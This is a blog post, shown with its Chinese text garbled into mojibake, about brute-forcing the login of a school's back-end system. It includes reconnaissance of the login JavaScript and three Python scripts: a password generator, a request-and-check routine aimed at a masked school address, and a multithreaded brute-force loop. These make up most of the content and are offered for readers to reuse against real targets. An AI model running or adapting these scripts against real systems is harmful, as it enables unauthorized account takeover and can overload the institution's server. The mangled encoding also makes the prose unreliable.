---
title: ã€Œå±ã€æš´åŠ›æ”»å…¥å­¦æ ¡çš„åå°ç³»ç»Ÿ
createdAt: "2021-05-29"
category: æ—¥å¸¸
heroImg: https://www.hualigs.cn/image/60b24cbc1d501.jpg
---

å±é™©æ“ä½œï¼Œè¯·é…Œæƒ…é‡‡ç”¨ï¼Œæœ¬æ–‡ä»…æä¾›æš´åŠ›ç ´è§£çš„æ€è·¯ï¼Œä»ä¸€ä¸ªå®ä¾‹ä¸­å­¦ä¹ ã€‚

æœ¬æ–‡ä¸æ˜¯ä¸“é—¨é’ˆå¯¹å­¦æ ¡ï¼Œåªæ˜¯å› ä¸ºå­¦æ ¡çš„æœåŠ¡å™¨é˜²å¾¡åŠ›æ¯”è¾ƒé«˜ï¼Œåœ¨å—åˆ°æ”»å‡»çš„æ—¶å€™ä¼šå¾ˆè‡ªè§‰åœ°è¿”å› **æœåŠ¡å™¨å‹åŠ›è¿‡å¤§**ï¼Œå³ä½¿ä»ç†è®ºä¸Šæ¥è®²ç»™åŸƒæ‹‰ä¸¤ä¸‰å¹´çš„æ—¶é—´å¯ä»¥ç ´è§£è¿›å»ï¼Œä½†æ˜¯å­¦æ ¡çš„å“åº”é€Ÿåº¦ä¹ŸçœŸçš„æ˜¯æ„Ÿäººï¼Œæ˜¯ä¸ªäººéƒ½æ²¡æœ‰è¿™ç§è€å¿ƒï¼ˆæ¯•ç«Ÿæˆ‘æ²¡æœ‰é‚£ä¹ˆå¤šé’±å»åº”é…¬äº‘æœåŠ¡å™¨ï¼Œè€Œä¸”æµªè´¹æ—¶é—´åœ¨è¿™ç§æ— ä»·å€¼çš„åœ°æ–¹ä¹Ÿä¸æ˜¯ä¸Šç­–ï¼‰


ç”Ÿæˆã€åˆ›å»ºè¿›ç¨‹ã€å‘é€ã€ç­‰è¿”å›ã€å…³é—­ï¼Œä¸€æ°”å‘µæˆ

## ä¾¦å¯Ÿä»»åŠ¡ï¼Œå‹˜æ¢åœ°å½¢

å¦‚æœä½ ä»”ç»†å‘æ˜ä¸€ä¸‹ç»ˆç«¯ï¼Œä½ ä¼šå‘ç°å‡ ä¸ªé‡è¦çš„å…¥å£ï¼ŒåŸƒæ‹‰è¿™é‡Œæ˜¯ `/theme/js/login.js` çš„ Javascript æ–‡ä»¶

![](https://www.hualigs.cn/image/60b25080753d8.jpg)

ç„¶åæ‰“å¼€å®ƒæ¥ç ”ç©¶ç ”ç©¶ï¼Œä½ ä¼šå‘ç°å­˜å‚¨ç”¨æˆ·åçš„å˜é‡ç«Ÿç„¶å« `usrname`ï¼Œå¯†ç æ˜¯ `passwd`ï¼Œå¹¶ä¸”åºåˆ—åŒ–åå°±æ¯«ä¸çŠ¹è±«åœ° POST å‡ºå»äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªå·±ç”¨ Postman æ¥è¯•è¯•çœ‹è¡Œä¸è¡Œ

![](https://www.hualigs.cn/image/60b250ffbdabb.jpg)

ç„¶åè£…æ¨¡åšæ ·åœ°å†™å¥½è¦ä¼ è¿‡å»çš„æ•°æ®ï¼ˆ`å­¦ç”Ÿä¼š1` è¿™ä¸ªç”¨æˆ·åæ˜¯åŸƒæ‹‰é€šè¿‡å°é“æ¶ˆæ¯å¾—æ¥çš„ï¼Œé€šå¸¸ä½ ä»¬å¯ä»¥è¯•è¯•çœ‹ admin ä¹‹ç±»çš„ï¼‰

![](https://www.hualigs.cn/image/60b2522570d02.jpg)

ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ° `<p class="error">ç™»å½•å¤±è´¥ï¼Œå¯†ç é”™è¯¯.</p>` è¿™æ ·çš„è¿”å›å€¼ï¼ˆå¦‚æœç”¨æˆ·åä¸å­˜åœ¨åˆ™ä¼šç›´æ¥æç¤º `ç”¨æˆ·ä¸å­˜åœ¨`ï¼‰ï¼Œç°åœ¨æˆ‘ä»¬å°±å¤§æ¦‚çŸ¥é“äº†å‡ ä¸ªé‡è¦çš„ä¿¡æ¯ï¼š

- è¢«æ”»å‡»è€…çš„ URL
- éœ€è¦æä¾›çš„æ•°æ®
- è¿”å›çš„æ•°æ®

## é€šè¿‡å­—å…¸ç”Ÿæˆå¯†ç 

```python
import itertools as its

def crack():
    words="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@." # ä½ è§‰å¾—å¯èƒ½å‡ºç°çš„å­—ç¬¦ï¼Œå¯†ç å¤šä¸º ASCII ç å­—ç¬¦
    count=0
    for num in range(6,20): # æŒ‡å®šå¯†ç ä½æ•°ï¼Œè¿™é‡Œæ˜¯ä» 6~20 ä½
        keys=its.product(words,repeat=num)
        for key in keys:
            print("".join(key)) # æ­¤æ—¶ "".join(key) å³ä¸ºç”Ÿæˆçš„å¯†ç 
            count += 1
```

## å‘é€æ•°æ®ï¼Œå¤„ç†è¿”å›å€¼

```python
import requests
from bs4 import BeautifulSoup

def inject(passwd): # è¿™é‡Œä¼ å…¥åˆšåˆšç”Ÿæˆçš„å¯†ç 
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36' }
    all_url = 'http://xxx.xxx.xx.xxx:30000/xxxxxx.php/base/login'  # è¿™é‡Œå±è”½ä¸€ä¸‹ ipv4ï¼Œå…å¾—å­¦æ ¡æ‰¾æˆ‘éº»çƒ¦
    start_html = requests.post(all_url,  headers=headers, json= {
        "usrname": "", # é—®é—®ä½ é«˜äºŒé«˜ä¸‰çš„å­¦é•¿ï¼Œä»–ä»¬å¯èƒ½ä¼šå‘Šè¯‰ä½ ç”¨æˆ·å
        "passwd": passwd
    })
    soup = BeautifulSoup(start_html.text, 'lxml') # ä½¿ç”¨ bs4 å¯¹è¿”å›çš„ html è¿›è¡Œè§£æ
    try:
        if soup.select("p[class='error']")[0].getText() != "ç™»å½•å¤±è´¥ï¼Œå¯†ç é”™è¯¯.": # å‰–æ htmlï¼Œæå–å‡ºè¿™ä¸ªè¿”å›ä¿¡æ¯ï¼Œå¦‚æœä¸æ˜¯è¿™ä¸ªè¿”å›ä¿¡æ¯ï¼Œé‚£å°±å¯¹äº†ï¼ˆå› ä¸ºç”¨æˆ·åæ˜¯å·²çŸ¥çš„ï¼ˆå¯¹åŸƒæ‹‰è€Œè¨€ï¼‰ï¼‰
            print("[âˆš æˆåŠŸç ´è§£] The PASSWD is '"+ passwd +"\n")
            with open('success.txt', 'w') as file:
                file.write("[âˆš æˆåŠŸç ´è§£] The PASSWD is '"+ passwd +"\n") # ä¿å­˜æ­£ç¡®çš„å¯†ç 
                file.close()
        else:
            print("[Ã— é”™è¯¯] "+passwd+"\n") # è¾“å‡ºé”™è¯¯çš„å¯†ç 
    except:
        print("[Ã— å¼‚å¸¸] "+passwd+"\n") # æŠ›å‡ºå¼‚å¸¸
```

## æå‡ç ´è§£æ•ˆç‡

å¦‚æœæˆ‘ä»¬åªæ˜¯ä½¿ç”¨åˆšåˆšçš„æ–¹æ³•ï¼Œé‚£ä¹ˆæ¯ä¸€æ¬¡çš„ç ´è§£éƒ½ä¼šåœ¨ä¸Šä¸€ä¸ªç ´è§£å®Œæˆåæ‰è¿›è¡Œï¼Œè¿™æ ·ä¼š **å¾ˆæ…¢å¾ˆæ…¢**ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šçº¿ç¨‹æ¥å…‹æœè¿™ä¸ªé—®é¢˜ï¼Œæœ€ç»ˆçš„ä»£ç å¦‚ä¸‹

```python
"""
ğŸ€ æœ¬ä»£ç ç†è®ºä¸Šå¯è¡Œï¼Œä½†æ˜¯éœ€è¦å……è¶³çš„æ—¶é—´ï¼Œèµ·ç ä¸‰å¹´å§ï¼Œä¸å–å†³äºä½ çš„ç®—åŠ›ï¼Œè€Œæ˜¯ä»–ä»¬çš„ååº”èƒ½åŠ›ï¼ˆæ•æˆ‘ç›´è¨€ï¼Œæˆ‘å®åœ¨æ²¡è§è¿‡è¿™ä¹ˆåƒåœ¾çš„æœåŠ¡å™¨ï¼‰
ã€æœ¬ä»£ç åœ¨æ­£å¸¸æƒ…å†µä¸‹ç¦æ­¢è¿è¡Œï¼ˆé™¤éè¿«ä¸å¾—å·²ï¼‰ï¼Œå¦åˆ™åæœè‡ªè´Ÿï¼ã€‘
å¦‚æœä½ è¦é—®æˆ‘ä¸ºä»€ä¹ˆæè¿™ä¸ªï¼Œé‚£ä¹ˆå°±é—®é—®è€ƒè¯•é™¢ä¸ºä»€ä¹ˆè¦åŠ  Pythonï¼Œä»¥åŠï¼Œå­¦æ ¡å›¾ä¹¦é¦†ä¸ºä»€ä¹ˆæ•™ä¼šäº†æˆ‘çˆ¬è™«å’Œæ•°æ®è§£æ
"""
import requests
from bs4 import BeautifulSoup
import itertools as its
import _thread
import time

def inject(passwd,thread_name):
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36' }
    all_url = 'http://xxx.xxx.xx.xxx:30000/xxxxxxx.php/base/login'
    start_html = requests.post(all_url,  headers=headers, json= {
        "usrname": "",
        "passwd": passwd
    })
    soup = BeautifulSoup(start_html.text, 'lxml')
    try:
        if soup.select("p[class='error']")[0].getText() != "ç™»å½•å¤±è´¥ï¼Œå¯†ç é”™è¯¯.":
            print("[âˆš æˆåŠŸç ´è§£] The PASSWD is '"+ passwd + "'"+" çº¿ç¨‹åï¼š"+thread_name+"\n")
            with open('success.txt', 'w') as file:
                file.write("[âˆš æˆåŠŸç ´è§£] The PASSWD is '"+ passwd + "'"+" çº¿ç¨‹åï¼š"+thread_name+"\n")
                file.close()
        else:
            print("[Ã— é”™è¯¯] "+passwd+" çº¿ç¨‹åï¼š"+thread_name+"\n")
    except:
        print("[Ã— å¼‚å¸¸] "+passwd+" çº¿ç¨‹åï¼š"+thread_name+"\n")
    _thread.exit() # é€€å‡ºå½“å‰çº¿ç¨‹

def crack():
    words="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@."
    count=0
    for num in range(6,20):
        keys=its.product(words,repeat=num)
        for key in keys:
            _thread.start_new_thread( inject, ("".join(key), "Thread-"+str(count), ) )
            time.sleep(0.05) # å¦‚æœä½ è°ƒæˆæ›´å°çš„æ•°å€¼ï¼Œä½ å°±ç­‰æ ¡é¢†å¯¼æ‰¾ä¸Šé—¨æ¥å§ï¼Œå› ä¸ºæœåŠ¡å™¨ä¼šç›´æ¥å´©æºƒï¼
            count += 1

if __name__ == "__main__":
    crack()
```

è¯·æ³¨æ„æ§åˆ¶å¥½çº¿ç¨‹åˆ›å»ºé€Ÿåº¦ï¼å¦‚æœä½ è®¾ç½®å¾—å¤ªå°ï¼Œå°±ç®—ä½ çš„è®¡ç®—æœºæ‰¿å—çš„ä½ï¼Œäººå®¶çš„æœåŠ¡å™¨å¯èƒ½æ‰¿å—ä¸ä½~

OKï¼Œå°±è¿™ä¹ˆå¤šäº†ï¼ŒåŒæ ·çš„ä»£ç æˆ‘å·²ç»å‘å¸ƒåˆ° Github Gist ä¸Šï¼Œå¯ä»¥è¿›è¡ŒæŸ¥é˜…ï¼ğŸ€åç»­å¯èƒ½ä¼šå†å‡ºä¸€äº›å…‹æœéªŒè¯ç çš„æ–¹æ¡ˆï¼